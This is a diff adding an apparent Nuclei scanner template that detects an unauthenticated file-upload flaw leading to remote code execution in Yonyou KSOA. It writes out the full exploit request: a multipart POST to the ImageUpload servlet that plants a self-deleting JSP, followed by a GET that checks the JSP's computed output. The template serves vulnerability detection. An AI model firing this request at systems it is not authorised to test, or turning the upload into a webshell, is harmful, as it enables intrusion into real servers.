@@ -1,0 +1,48 @@
+id: yonyou-ksoa-file-upload
+info:
+  name: Yonyou KSOA Unauthenticated File Upload RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Yonyou KSOA allows unauthenticated file upload leading to Remote Code Execution.
+  reference:
+    - https://cn-sec.com/archives/1329088.html
+http:
+  - raw:
+      - |
+        POST /servlet/com.sksoft.bill.ImageUpload?filepath=/&filename={{random_filename}}.jsp&_ZQA_ID= HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{random_boundary}}
+
+        ------WebKitFormBoundary{{random_boundary}}
+        Content-Disposition: form-data; name="file"; filename="{{random_filename}}.jsp"
+        Content-Type: text/plain
+
+        <%out.print({{random_int1}} * {{random_int2}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+        ------WebKitFormBoundary{{random_boundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "<root>"
+  - raw:
+      - |
+        GET /pictures/{{random_filename}}.jsp HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{computed_value}}"
+variables:
+  random_filename: "{{rand_base(4)}}"
+  random_boundary: "{{rand_base(8)}}"
+  random_int1: "{{rand_int(40000, 44800)}}"
+  random_int2: "{{rand_int(40000, 44800)}}"
+  computed_value: "{{to_number(random_int1) * to_number(random_int2)}}"
